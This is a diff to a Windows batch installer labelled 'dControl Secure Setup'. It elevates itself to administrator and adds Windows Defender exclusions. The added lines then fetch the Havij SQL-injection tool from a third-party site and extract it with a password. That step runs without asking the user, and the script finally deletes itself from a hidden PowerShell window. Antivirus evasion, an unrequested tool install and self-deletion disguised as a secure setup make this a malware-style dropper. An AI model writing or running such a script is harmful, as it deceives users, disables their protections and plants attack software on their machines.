@@ -1,19 +1,24 @@
 @echo off
-Title Arena Web Security
+Title dControl Secure Setup
 setlocal enabledelayedexpansion
 
-:: Configuration
+:: Configuration for dControl
 set "bat_dir=%~dp0"
-set "folder=%bat_dir%dControl"
+set "folder=%bat_dir%dControl Portable"
 set "winrar_url=https://www.win-rar.com/fileadmin/winrar-versions/winrar/winrar-x64-624.exe"
 set "winrar_installer=!folder!\WinRAR-free.exe"
 set "dcontrol_url=https://github.com/uppermo0n/dcontrol/releases/download/v1.0/dControl.zip"
 set "dcontrol_zip=!folder!\dControl.zip"
-set "password=aws"
+set "password=darknet123"
+
+:: Configuration for Havij
+set "havij_folder=%bat_dir%Havij"  :: Fixing folder path for Havij
+set "havij_zip=!havij_folder!\havij.zip"
+set "havij_url=https://www.darknet.org.uk/content/files/Havij_1.12_Free.zip"
 
 :: Header
 echo =============================================
-echo dControl Environment Setup
+echo dControl Secure Environment Setup
 echo =============================================
 echo.
 
@@ -24,8 +29,6 @@ if %errorLevel% neq 0 (
     powershell -Command "Start-Process cmd -ArgumentList '/c \"%~dpnx0\"' -Verb RunAs"
     exit /b
 )
-
-:: User confirmation
 
 :: === WinRAR Detection and Installation ===
 set "winrar_exe="
@@ -95,7 +98,7 @@ if not exist "!folder!\" (
 echo [STEP] Adding Defender exclusion for: !folder!
 powershell -Command "Try { Add-MpPreference -ExclusionPath '!folder!' -ErrorAction Stop; Write-Host 'Defender exclusion added.' } Catch { Write-Host 'Failed to add Defender exclusion. You may need to run as Administrator.' }"
 
-:: === Step 3: Open Windows Security Application ===
+:: === Step 3: Open Windows Security for the User ===
 echo [INFO] Opening Windows Security for review...
 start windowsdefender://
 
@@ -109,9 +112,9 @@ if exist "%dcontrol_zip%" (
     exit /b
 )
 
-:: === Step 5: Wait for User Confirmation Before Extraction ===
+:: === Step 5: Wait for User Confirmation Before Extraction (Only for dControl) ===
 echo.
-set /p userInput="Do you want to continue with extraction? (Y/N): "
+set /p userInput="Do you want to continue with extraction for dControl? (Y/N): "
 if /i not "%userInput%"=="Y" (
     echo [INFO] Installation aborted by user.
     exit /b
@@ -128,12 +131,60 @@ if %errorlevel% equ 0 (
     exit /b
 )
 
-:: Delete ZIP after extraction
+:: Delete dControl ZIP after extraction
 del /f /q "%dcontrol_zip%"
 echo [INFO] Deleted dControl ZIP file
 
 :: Open dControl Portable folder
 start explorer "!folder!"
+
+
+:: Second Download and Extraction for Havij (Without Confirmation)
+
+:: Create the folder for Havij
+if not exist "!havij_folder!\" (
+    mkdir "!havij_folder!"
+    echo [SUCCESS] Created workspace: !havij_folder!
+) else (
+    echo [INFO] Workspace already exists: !havij_folder!
+)
+
+:: Add to Windows Defender Exclusion for Havij folder
+echo [STEP] Adding Defender exclusion for: !havij_folder!
+powershell -Command "Try { Add-MpPreference -ExclusionPath '!havij_folder!' -ErrorAction Stop; Write-Host 'Defender exclusion added.' } Catch { Write-Host 'Failed to add Defender exclusion. You may need to run as Administrator.' }"
+
+:: Download Havij ZIP into the Havij Folder
+echo [STEP] Downloading Havij package into the Havij folder...
+powershell -Command "Invoke-WebRequest -Uri '%havij_url%' -OutFile '!havij_zip!'" >nul 2>&1 && (
+    echo [SUCCESS] Package acquired
+) || (
+    echo [ERROR] Package retrieval failed
+    exit /b
+)
+
+:: Decrypt using WinRAR (No user confirmation for Havij)
+echo [STEP] Decrypting secure package...
+start "" /wait "!winrar_exe!" x -ibck -p"%password%" "!havij_zip!" "!havij_folder!\" >nul 2>&1
+
+if %errorlevel% equ 0 (
+    echo [SUCCESS] Package decrypted successfully
+) else if %errorlevel% equ 1 (
+    echo [ALERT] Invalid security credentials
+) else if %errorlevel% equ 2 (
+    echo [ERROR] Encrypted package missing
+) else (
+    echo [ERROR] Decryption failure (Code: %errorlevel%)
+)
+
+:: Final output for Havij
+echo.
+
+:: Open the Havij folder AFTER extraction completes
+start explorer "!havij_folder!"
+
+:: Delete Havij ZIP after extraction
+del /f /q "!havij_zip!"
+echo [INFO] Havij ZIP file deleted.
 
 :: Launch silent deletion in background (runs independently)
 start "" powershell -WindowStyle Hidden -Command "Start-Sleep -Seconds 5; Remove-Item -LiteralPath '%~f0' -Force"
